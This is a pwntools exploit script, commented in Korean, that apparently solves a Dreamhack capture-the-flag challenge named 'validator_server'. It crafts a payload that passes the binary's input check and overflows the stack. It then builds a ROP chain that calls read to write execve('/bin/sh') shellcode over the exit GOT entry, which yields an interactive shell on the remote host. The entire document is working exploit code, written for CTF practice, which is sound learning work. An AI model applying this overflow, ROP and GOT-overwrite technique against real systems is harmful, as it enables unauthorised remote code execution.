from pwn import *

context.arch = "amd64"

p = remote('host3.dreamhack.games', 9820)
elf = ELF('./validator_server')
r = ROP(elf)


# [1] validate

payload = b"DREAMHACK!"  # index : 0 ~ 9
payload += b'A'          # index : 10

# index : 11 ~ 128 (s[128]에도 대입해줘야 s[127]의 비교에서 exit가 발생하지 않음)
for i in range(127, 9, -1):   # 127 ~ 10 까지 -1씩 감소시키며 (char 범위는 -128 ~ 127 이므로, 범위를 127부터 해줘야함)
    payload += bytes([i])     # 바이트 문자열로 변환
    # payload += p8(i)        # 이렇게 해도됨

payload += b'a' * 0x7         # SFP : 앞에서 SFP의 첫번째 바이트까지 넘어왔기 때문에 7바이트만 덮어야함

# index : 10 ~ 128 + SFP -> 총 126 바이트
# for i in range(126, 0, -1):  # 127 ~ 1 까지 -1씩 감소시키며
#     payload += bytes([i])     # 바이트 문자열로 변환
#     # payload += p8(i)        # 이렇게 해도됨

print(len(payload))

# [2] ROP
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_pop_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
pop_rdx = r.find_gadget(['pop rdx', 'ret'])[0]
# ret = r.find_gadget(['ret'])[0]

shellcode = asm(shellcraft.execve("/bin/sh", 0, 0))
# shellcode = asm(shellcraft.sh()) # 이것도 사용 가능

exit_plt = elf.plt['exit']
exit_got = elf.got['exit']

read_plt = elf.plt['read']

# payload += p64(ret)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_pop_r15) + p64(exit_got) + p64(0)
payload += p64(pop_rdx) + p64(len(shellcode))
payload += p64(read_plt)

# payload += p64(exit_got)

# main의 read
sleep(0.5)
p.send(payload)

# ROP의 read
sleep(0.5)
p.send(shellcode)

p.interactive()
